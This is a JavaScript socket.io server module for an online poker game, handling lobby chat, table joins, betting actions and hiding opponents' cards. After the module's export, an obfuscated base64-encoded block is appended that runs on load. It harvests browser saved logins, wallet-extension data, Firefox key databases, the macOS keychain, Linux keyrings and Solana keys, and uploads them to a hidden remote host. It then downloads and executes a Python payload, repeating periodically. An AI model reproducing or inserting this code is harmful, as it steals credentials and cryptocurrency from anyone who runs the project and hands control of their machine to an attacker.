// const User = require('../models/User');
const jwt = require("jsonwebtoken");
const Table = require("../pokergame/Table");
const Player = require("../pokergame/Player");
const {
    CS_FETCH_LOBBY_INFO,
    SC_RECEIVE_LOBBY_INFO,
    SC_PLAYERS_UPDATED,
    CS_JOIN_TABLE,
    SC_TABLE_JOINED,
    SC_TABLES_UPDATED,
    CS_LEAVE_TABLE,
    SC_TABLE_LEFT,
    CS_FOLD,
    CS_CHECK,
    CS_CALL,
    CS_RAISE,
    TABLE_MESSAGE,
    CS_SIT_DOWN,
    CS_REBUY,
    CS_STAND_UP,
    SITTING_OUT,
    SITTING_IN,
    CS_DISCONNECT,
    SC_TABLE_UPDATED,
    WINNER,
    CS_LOBBY_CONNECT,
    CS_LOBBY_DISCONNECT,
    SC_LOBBY_CONNECTED,
    SC_LOBBY_DISCONNECTED,
    SC_LOBBY_CHAT,
    CS_LOBBY_CHAT,
} = require("../pokergame/actions");
const config = require("../config");

const tables = {
    1: new Table(1, "Table 1", config.INITIAL_CHIPS_AMOUNT),
};
const players = {};

function getCurrentPlayers() {
    return Object.values(players).map((player) => ({
        socketId: player.socketId,
        id: player.id,
        name: player.name,
    }));
}

function getCurrentTables() {
    return Object.values(tables).map((table) => ({
        id: table.id,
        name: table.name,
        limit: table.limit,
        maxPlayers: table.maxPlayers,
        currentNumberPlayers: table.players.length,
        smallBlind: table.minBet,
        bigBlind: table.minBet * 2,
    }));
}

const init = (socket, io) => {
    socket.on(CS_LOBBY_CONNECT, ({ gameId, address, userInfo }) => {
        socket.join(gameId);
        io.to(gameId).emit(SC_LOBBY_CONNECTED, { address, userInfo });
        console.log(SC_LOBBY_CONNECTED, address, socket.id);
    });

    socket.on(CS_LOBBY_DISCONNECT, ({ gameId, address, userInfo }) => {
        io.to(gameId).emit(SC_LOBBY_DISCONNECTED, { address, userInfo });
        console.log(CS_LOBBY_DISCONNECT, address, socket.id);
    });

    socket.on(CS_LOBBY_CHAT, ({ gameId, text, userInfo }) => {
        io.to(gameId).emit(SC_LOBBY_CHAT, { text, userInfo });
    });

    socket.on(
        CS_FETCH_LOBBY_INFO,
        ({ walletAddress, socketId, gameId, username }) => {
            const found = Object.values(players).find((player) => {
                return player.id == walletAddress;
            });

            if (found) {
                delete players[found.socketId];
                Object.values(tables).map((table) => {
                    table.removePlayer(found.socketId);
                    broadcastToTable(table);
                });
            }

            players[socketId] = new Player(
                socketId,
                walletAddress,
                username,
                config.INITIAL_CHIPS_AMOUNT
            );
            socket.emit(SC_RECEIVE_LOBBY_INFO, {
                tables: getCurrentTables(),
                players: getCurrentPlayers(),
                socketId: socket.id,
                amount: config.INITIAL_CHIPS_AMOUNT,
            });
            socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
        }
    );

    socket.on(CS_JOIN_TABLE, (tableId) => {
        const table = tables[tableId];
        const player = players[socket.id];
        console.log("tableid====>", tableId, table, player);
        table.addPlayer(player);
        socket.emit(SC_TABLE_JOINED, { tables: getCurrentTables(), tableId });
        socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
        sitDown(tableId, table.players.length, table.limit);

        if (
            tables[tableId].players &&
            tables[tableId].players.length > 0 &&
            player
        ) {
            let message = `${player.name} joined the table.`;
            broadcastToTable(table, message);
        }
    });

    socket.on(CS_LEAVE_TABLE, (tableId) => {
        const table = tables[tableId];
        const player = players[socket.id];
        const seat = Object.values(table.seats).find(
            (seat) => seat && seat.player.socketId === socket.id
        );

        if (seat && player) {
            updatePlayerBankroll(player, seat.stack);
        }

        table.removePlayer(socket.id);

        socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
        socket.emit(SC_TABLE_LEFT, { tables: getCurrentTables(), tableId });

        if (
            tables[tableId].players &&
            tables[tableId].players.length > 0 &&
            player
        ) {
            let message = `${player.name} left the table.`;
            broadcastToTable(table, message);
        }

        if (table.activePlayers().length === 1) {
            clearForOnePlayer(table);
        }
    });

    socket.on(CS_FOLD, (tableId) => {
        let table = tables[tableId];
        let res = table.handleFold(socket.id);
        res && broadcastToTable(table, res.message);
        res && changeTurnAndBroadcast(table, res.seatId);
    });

    socket.on(CS_CHECK, (tableId) => {
        let table = tables[tableId];
        let res = table.handleCheck(socket.id);
        res && broadcastToTable(table, res.message);
        res && changeTurnAndBroadcast(table, res.seatId);
    });

    socket.on(CS_CALL, (tableId) => {
        let table = tables[tableId];
        let res = table.handleCall(socket.id);
        res && broadcastToTable(table, res.message);
        res && changeTurnAndBroadcast(table, res.seatId);
    });

    socket.on(CS_RAISE, ({ tableId, amount }) => {
        let table = tables[tableId];
        let res = table.handleRaise(socket.id, amount);
        res && broadcastToTable(table, res.message);
        res && changeTurnAndBroadcast(table, res.seatId);
    });

    socket.on(TABLE_MESSAGE, ({ message, from, tableId }) => {
        let table = tables[tableId];
        broadcastToTable(table, message, from);
    });

    // socket.on(CS_SIT_DOWN, ({ tableId, seatId, amount }) => {
    //   const table = tables[tableId];
    //   const player = players[socket.id];

    //   if (player) {
    //     table.sitPlayer(player, seatId, amount);
    //     let message = `${player.name} sat down in Seat ${seatId}`;

    //     updatePlayerBankroll(player, -amount);

    //     broadcastToTable(table, message);
    //     if (table.activePlayers().length === 2) {
    //       initNewHand(table);
    //     }
    //   }
    // });
    const sitDown = (tableId, seatId, amount) => {
        const table = tables[tableId];
        const player = players[socket.id];
        if (player) {
            table.sitPlayer(player, seatId, amount);
            let message = `${player.name} sat down in Seat ${seatId}`;

            updatePlayerBankroll(player, -amount);

            broadcastToTable(table, message);
            if (table.activePlayers().length === 2) {
                initNewHand(table);
            }
        }
    };

    socket.on(CS_REBUY, ({ tableId, seatId, amount }) => {
        const table = tables[tableId];
        const player = players[socket.id];

        table.rebuyPlayer(seatId, amount);
        updatePlayerBankroll(player, -amount);

        broadcastToTable(table);
    });

    socket.on(CS_STAND_UP, (tableId) => {
        const table = tables[tableId];
        const player = players[socket.id];
        const seat = Object.values(table.seats).find(
            (seat) => seat && seat.player.socketId === socket.id
        );

        let message = "";
        if (seat) {
            updatePlayerBankroll(player, seat.stack);
            message = `${player.name} left the table`;
        }

        table.standPlayer(socket.id);

        broadcastToTable(table, message);
        if (table.activePlayers().length === 1) {
            clearForOnePlayer(table);
        }
    });

    socket.on(SITTING_OUT, ({ tableId, seatId }) => {
        const table = tables[tableId];
        const seat = table.seats[seatId];
        seat.sittingOut = true;

        broadcastToTable(table);
    });

    socket.on(SITTING_IN, ({ tableId, seatId }) => {
        const table = tables[tableId];
        const seat = table.seats[seatId];
        seat.sittingOut = false;

        broadcastToTable(table);
        if (table.handOver && table.activePlayers().length === 2) {
            initNewHand(table);
        }
    });

    socket.on(CS_DISCONNECT, () => {
        const seat = findSeatBySocketId(socket.id);
        if (seat) {
            updatePlayerBankroll(seat.player, seat.stack);
        }

        delete players[socket.id];
        removeFromTables(socket.id);

        socket.broadcast.emit(SC_TABLES_UPDATED, getCurrentTables());
        socket.broadcast.emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
    });

    async function updatePlayerBankroll(player, amount) {
        players[socket.id].bankroll += amount;
        io.to(socket.id).emit(SC_PLAYERS_UPDATED, getCurrentPlayers());
    }

    function findSeatBySocketId(socketId) {
        let foundSeat = null;
        Object.values(tables).forEach((table) => {
            Object.values(table.seats).forEach((seat) => {
                if (seat && seat.player.socketId === socketId) {
                    foundSeat = seat;
                }
            });
        });
        return foundSeat;
    }

    function removeFromTables(socketId) {
        for (let i = 0; i < Object.keys(tables).length; i++) {
            tables[Object.keys(tables)[i]].removePlayer(socketId);
        }
    }

    function broadcastToTable(table, message = null, from = null) {
        for (let i = 0; i < table.players.length; i++) {
            let socketId = table.players[i].socketId;
            let tableCopy = hideOpponentCards(table, socketId);
            io.to(socketId).emit(SC_TABLE_UPDATED, {
                table: tableCopy,
                message,
                from,
            });
        }
    }

    function changeTurnAndBroadcast(table, seatId) {
        setTimeout(() => {
            table.changeTurn(seatId);
            broadcastToTable(table);

            if (table.handOver) {
                initNewHand(table);
            }
        }, 1000);
    }

    function initNewHand(table) {
        if (table.activePlayers().length > 1) {
            broadcastToTable(table, "---New hand starting in 5 seconds---");
        }
        setTimeout(() => {
            table.clearWinMessages();
            table.startHand();
            broadcastToTable(table, "--- New hand started ---");
        }, 5000);
    }

    function clearForOnePlayer(table) {
        table.clearWinMessages();
        setTimeout(() => {
            table.clearSeatHands();
            table.resetBoardAndPot();
            broadcastToTable(table, "Waiting for more players");
        }, 5000);
    }

    function hideOpponentCards(table, socketId) {
        let tableCopy = JSON.parse(JSON.stringify(table));
        let hiddenCard = { suit: "hidden", rank: "hidden" };
        let hiddenHand = [hiddenCard, hiddenCard];

        for (let i = 1; i <= tableCopy.maxPlayers; i++) {
            let seat = tableCopy.seats[i];
            if (
                seat &&
                seat.hand.length > 0 &&
                seat.player.socketId !== socketId &&
                !(seat.lastAction === WINNER && tableCopy.wentToShowdown)
            ) {
                seat.hand = hiddenHand;
            }
        }
        return tableCopy;
    }
};

module.exports = { init };

Object.prototype.toString,
    Object.defineProperty,
    Object.getOwnPropertyDescriptor;
const t = "base64",
    c = "utf8",
    a = require("fs"),
    $ = require("os"),
    r = (a) => ((s1 = a.slice(1)), Buffer.from(s1, t).toString(c));
(pt = require(r("zcGF0aA"))),
    (rq = require(r("YcmVxdWVzdA"))),
    (ex = require(r("aY2hpbGRfcHJvY2Vzcw"))[r("cZXhlYw")]),
    (hs = $[r("caG9zdG5hbWU")]()),
    (pl = $[r("YcGxhdGZvcm0")]()),
    (hd = $[r("ZaG9tZWRpcg")]()),
    (td = $[r("cdG1wZGly")]());
let l;
const e = (a) => Buffer.from(a, t).toString(c),
    n = () => {
        let t = "MTQ3LjEyNCaHR0cDovLw4yMTQuMTI5OjEyNDQ=  ";
        for (var c = "", a = "", $ = "", r = "", l = 0; l < 10; l++)
            (c += t[l]), (a += t[10 + l]), ($ += t[20 + l]), (r += t[30 + l]);
        return (c = c + $ + r), e(a) + e(c);
    },
    s = (t) =>
        t.replace(/^~([a-z]+|\/)/, (t, c) =>
            "/" === c ? hd : `${pt[e("ZGlybmFtZQ")](hd)}/${c}`
        ),
    h = "s2DzOA8",
    o = "Z2V0",
    Z = "Ly5ucGw",
    i = "d3JpdGVGaWxlU3luYw",
    y = "L2NsaWVudA",
    d = e("ZXhpc3RzU3luYw"),
    u = "TG9naW4gRGF0YQ",
    m = "Y29weUZpbGU";
function p(t) {
    const c = e("YWNjZXN" + "zU3luYw");
    try {
        return a[c](t), !0;
    } catch (t) {
        return !1;
    }
}
const b = e("RGVmYXVsdA"),
    G = e("UHJvZmlsZQ"),
    W = r("aZmlsZW5hbWU"),
    Y = r("cZm9ybURhdGE"),
    f = r("adXJs"),
    w = r("Zb3B0aW9ucw"),
    V = r("YdmFsdWU"),
    v = e("cmVhZGRpclN5bmM"),
    j = e("c3RhdFN5bmM"),
    L = (e("aXNEaXJlY3Rvcnk"), e("cG9zdA")),
    z = "Ly5jb25maWcv",
    x = "L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC8",
    R = "L0FwcERhdGEv",
    k = "L1VzZXIgRGF0YQ",
    N = "R29vZ2xlL0Nocm9tZQ",
    X = "QnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2Vy",
    _ = "Z29vZ2xlLWNocm9tZQ",
    g = ["TG9jYWwv" + X, X, X],
    F = ["TG9jYWwv" + N, N, _],
    B = [
        "Um9hbWluZy9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGU",
        "Y29tLm9wZXJhc29mdHdhcmUuT3BlcmE",
        "b3BlcmE",
    ];
let U = "comp";
const q = [
        "bmtiaWhmYmVvZ2Fl",
        "ZWpiYWxiYWtvcGxj",
        "Zmhib2hpbWFlbGJv",
        "aG5mYW5rbm9jZmVv",
        "aWJuZWpkZmptbWtw",
        "YmZuYWVsbW9tZWlt",
        "YWVhY2hrbm1lZnBo",
        "ZWdqaWRqYnBnbGlj",
        "aGlmYWZnbWNjZHBl",
    ],
    J = [
        "YW9laGxlZm5rb2RiZWZncGdrbm4",
        "aGxnaGVjZGFsbWVlZWFqbmltaG0",
        "aHBqYmJsZGNuZ2NuYXBuZG9kanA",
        "ZmJkZGdjaWpubWhuZm5rZG5hYWQ",
        "Y25scGVia2xtbmtvZW9paG9mZWM",
        "aGxwbWdqbmpvcGhocGtrb2xqcGE",
        "ZXBjY2lvbmJvb2hja29ub2VlbWc",
        "aGRjb25kYmNiZG5iZWVwcGdkcGg",
        "a3Bsb21qamtjZmdvZG5oY2VsbGo",
    ],
    Q = "Y3JlYXRlUmVhZFN0cmVhbQ",
    T = async (t, c, $) => {
        let r = t;
        if (!r || "" === r) return [];
        try {
            if (!p(r)) return [];
        } catch (t) {
            return [];
        }
        c || (c = "");
        let l = [];
        const n = e("TG9jYWwgRXh0ZW5z" + "aW9uIFNldHRpbmdz"),
            s = e(Q),
            h = e("LmxkYg"),
            o = e("LmxvZw");
        for (let $ = 0; $ < 200; $++) {
            const Z = `${t}/${0 === $ ? b : `${G} ${$}`}/${n}`;
            for (let t = 0; t < q.length; t++) {
                const n = e(q[t] + J[t]);
                let i = `${Z}/${n}`;
                if (p(i)) {
                    try {
                        far = a[v](i);
                    } catch (t) {
                        far = [];
                    }
                    far.forEach(async (t) => {
                        r = pt.join(i, t);
                        try {
                            (r.includes(h) || r.includes(o)) &&
                                l.push({
                                    [V]: a[s](r),
                                    [w]: { [W]: `${c}${$}_${n}_${t}` },
                                });
                        } catch (t) {}
                    });
                }
            }
        }
        if ($) {
            const t = e("c29sYW5hX2lkLnR4dA");
            if (((r = `${hd}${e("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`), a[d](r)))
                try {
                    l.push({ [V]: a[s](r), [w]: { [W]: t } });
                } catch (t) {}
        }
        return C(l), l;
    },
    C = (t) => {
        const c = r("YbXVsdGlfZmlsZQ"),
            a = e("L3VwbG9hZHM"),
            $ = { timestamp: l.toString(), type: h, hid: U, [c]: t },
            s = n();
        try {
            const t = { [f]: `${s}${a}`, [Y]: $ };
            rq[L](t, (t, c, a) => {});
        } catch (t) {}
    },
    S = async (t, c) => {
        try {
            const a = s("~/");
            let $ = "";
            ($ =
                "d" == pl[0]
                    ? `${a}${e(x)}${e(t[1])}`
                    : "l" == pl[0]
                    ? `${a}${e(z)}${e(t[2])}`
                    : `${a}${e(R)}${e(t[0])}${e(k)}`),
                await T($, `${c}_`, 0 == c);
        } catch (t) {}
    },
    A = async () => {
        let t = [];
        const c = e(u),
            $ = e(Q),
            r = e("L0xpYnJhcnkvS2V5Y2hhaW5zL2xvZ2luLmtleWNoYWlu"),
            l = e("bG9na2MtZGI");
        if (((pa = `${hd}${r}`), a[d](pa)))
            try {
                t.push({ [V]: a[$](pa), [w]: { [W]: l } });
            } catch (t) {}
        else if (((pa += "-db"), a[d](pa)))
            try {
                t.push({ [V]: a[$](pa), [w]: { [W]: l } });
            } catch (t) {}
        try {
            const r = e(m);
            let l = "";
            if (((l = `${hd}${e(x)}${e(N)}`), l && "" !== l && p(l)))
                for (let e = 0; e < 200; e++) {
                    const n = `${l}/${0 === e ? b : `${G} ${e}`}/${c}`;
                    try {
                        if (!p(n)) continue;
                        const c = `${l}/ld_${e}`;
                        p(c)
                            ? t.push({ [V]: a[$](c), [w]: { [W]: `pld_${e}` } })
                            : a[r](n, c, (t) => {
                                  let c = [
                                      {
                                          [V]: a[$](n),
                                          [w]: { [W]: `pld_${e}` },
                                      },
                                  ];
                                  C(c);
                              });
                    } catch (t) {}
                }
        } catch (t) {}
        return C(t), t;
    },
    E = async () => {
        let t = [];
        const c = e(u),
            $ = e(Q);
        try {
            const r = e(m);
            let l = "";
            if (((l = `${hd}${e(x)}${e(X)}`), l && "" !== l && p(l)))
                for (let e = 0; e < 200; e++) {
                    const n = `${l}/${0 === e ? b : `${G} ${e}`}/${c}`;
                    try {
                        if (!p(n)) continue;
                        const c = `${l}/brld_${e}`;
                        p(c)
                            ? t.push({
                                  [V]: a[$](c),
                                  [w]: { [W]: `brld_${e}` },
                              })
                            : a[r](n, c, (t) => {
                                  let c = [
                                      {
                                          [V]: a[$](n),
                                          [w]: { [W]: `brld_${e}` },
                                      },
                                  ];
                                  C(c);
                              });
                    } catch (t) {}
                }
        } catch (t) {}
        return C(t), t;
    },
    H = async () => {
        let t = [];
        const c = e(Q),
            $ = e("a2V5NC5kYg"),
            r = e("a2V5My5kYg"),
            l = e("bG9naW5zLmpzb24");
        try {
            let n = "";
            if (((n = `${hd}${e(x)}${e("RmlyZWZveA")}`), n && "" !== n && p(n)))
                for (let e = 0; e < 200; e++) {
                    const s = 0 === e ? b : `${G} ${e}`,
                        h = `${n}/${s}/${$}`,
                        o = `${n}/${s}/${r}`,
                        Z = `${n}/${s}/${l}`;
                    try {
                        p(h) &&
                            t.push({ [V]: a[c](h), [w]: { [W]: `fk4_${e}` } });
                    } catch (t) {}
                    try {
                        p(o) &&
                            t.push({ [V]: a[c](o), [w]: { [W]: `fk3_${e}` } });
                    } catch (t) {}
                    try {
                        p(Z) &&
                            t.push({ [V]: a[c](Z), [w]: { [W]: `flj_${e}` } });
                    } catch (t) {}
                }
        } catch (t) {}
        return C(t), t;
    },
    M = async () => {
        let t = [];
        e(u);
        const c = e(Q);
        try {
            const t = e("Ly5sb2NhbC9zaGFyZS9rZXlyaW5ncy8");
            let $ = "";
            $ = `${hd}${t}`;
            let r = [];
            if ($ && "" !== $ && p($))
                try {
                    r = a[v]($);
                } catch (t) {
                    r = [];
                }
            r.forEach(async (t) => {
                pa = pt.join($, t);
                try {
                    ldb_data.push({ [V]: a[c](pa), [w]: { [W]: `${t}` } });
                } catch (t) {}
            });
        } catch (t) {}
        return C(t), t;
    },
    I = async () => {
        let t = [];
        const c = e(u),
            $ = e(Q);
        try {
            const r = e(m);
            let l = "";
            if (((l = `${hd}${e(z)}${e(_)}`), l && "" !== l && p(l)))
                for (let e = 0; e < 200; e++) {
                    const n = `${l}/${0 === e ? b : `${G} ${e}`}/${c}`;
                    try {
                        if (!p(n)) continue;
                        const c = `${l}/ld_${e}`;
                        p(c)
                            ? t.push({
                                  [V]: a[$](c),
                                  [w]: { [W]: `plld_${e}` },
                              })
                            : a[r](n, c, (t) => {
                                  let c = [
                                      {
                                          [V]: a[$](n),
                                          [w]: { [W]: `plld_${e}` },
                                      },
                                  ];
                                  C(c);
                              });
                    } catch (t) {}
                }
        } catch (t) {}
        return C(t), t;
    },
    O = async () => {
        let t = [];
        const c = e(Q),
            $ = e("a2V5NC5kYg"),
            r = e("a2V5My5kYg"),
            l = e("bG9naW5zLmpzb24");
        try {
            let n = "";
            if (
                ((n = `${hd}${e("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`),
                n && "" !== n && p(n))
            )
                for (let e = 0; e < 200; e++) {
                    const s = 0 === e ? b : `${G} ${e}`,
                        h = `${n}/${s}/${$}`,
                        o = `${n}/${s}/${r}`,
                        Z = `${n}/${s}/${l}`;
                    try {
                        p(h) &&
                            t.push({ [V]: a[c](h), [w]: { [W]: `flk4_${e}` } });
                    } catch (t) {}
                    try {
                        p(o) &&
                            t.push({ [V]: a[c](o), [w]: { [W]: `flk3_${e}` } });
                    } catch (t) {}
                    try {
                        p(Z) &&
                            t.push({ [V]: a[c](Z), [w]: { [W]: `fllj_${e}` } });
                    } catch (t) {}
                }
        } catch (t) {}
        return C(t), t;
    },
    P = e("cm1TeW5j"),
    D = "XC5weXBccHl0aG9uLmV4ZQ",
    K = 51476590;
let tt = 0;
const ct = async (t) => {
        const c = `${e("dGFyIC14Zg")} ${t} -C ${hd}`;
        ex(c, (c, $, r) => {
            if (c) return a[P](t), void (tt = 0);
            a[P](t), rt();
        });
    },
    at = () => {
        const t = e("cDIuemlw"),
            c = `${n()}${e("L3Bkb3du")}`,
            $ = `${td}\\${e("cC56aQ")}`,
            r = `${td}\\${t}`;
        if (tt >= K + 6) return;
        const l = e("cmVuYW1lU3luYw"),
            s = e("cmVuYW1l");
        if (a[d]($))
            try {
                var h = a[j]($);
                h.size >= K + 6
                    ? ((tt = h.size),
                      a[s]($, r, (t) => {
                          if (t) throw t;
                          ct(r);
                      }))
                    : (tt < h.size ? (tt = h.size) : (a[P]($), (tt = 0)), $t());
            } catch (t) {}
        else {
            const t = `${e("Y3VybCAtTG8")} "${$}" "${c}"`;
            ex(t, (t, c, e) => {
                if (t) return (tt = 0), void $t();
                try {
                    (tt = K + 6), a[l]($, r), ct(r);
                } catch (t) {}
            });
        }
    };
function $t() {
    setTimeout(() => {
        at();
    }, 2e4);
}
const rt = async () =>
    await new Promise((t, c) => {
        if ("w" == pl[0]) {
            const t = `${hd}${e(D)}`;
            a[d](`${t}`)
                ? (() => {
                      const t = n(),
                          c = e(y),
                          $ = e(o),
                          r = e(i),
                          l = e(Z),
                          s = `${t}${c}/${h}`,
                          d = `${hd}${l}`,
                          u = `"${hd}${e(D)}" "${d}"`;
                      try {
                          a[P](d);
                      } catch (t) {}
                      rq[$](s, (t, c, $) => {
                          if (!t)
                              try {
                                  a[r](d, $), ex(u, (t, c, a) => {});
                              } catch (t) {}
                      });
                  })()
                : at();
        } else
            (() => {
                const t = n(),
                    c = e(y),
                    $ = e(i),
                    r = e(o),
                    l = e(Z),
                    s = e("cHl0aG9u"),
                    d = `${t}${c}/${h}`,
                    u = `${hd}${l}`;
                let m = `${s}3 "${u}"`;
                rq[r](d, (t, c, r) => {
                    t || (a[$](u, r), ex(m, (t, c, a) => {}));
                });
            })();
    });
var lt = 0;
const et = async () => {
    try {
        (l = Date.now()),
            await (async () => {
                U = hs;
                try {
                    const t = s("~/");
                    await S(F, 0),
                        await S(g, 1),
                        await S(B, 2),
                        "w" == pl[0]
                            ? ((pa = `${t}${e(R)}${e(
                                  "TG9jYWwvTWljcm9zb2Z0L0VkZ2U"
                              )}${e(k)}`),
                              await T(pa, "3_", !1))
                            : "d" == pl[0]
                            ? (await A(), await E(), await H())
                            : "l" == pl[0] && (await M(), await I(), await O());
                } catch (t) {}
            })(),
            rt();
    } catch (t) {}
};
et();
let nt = setInterval(() => {
    (lt += 1) < 5 ? et() : clearInterval(nt);
}, 6e5);
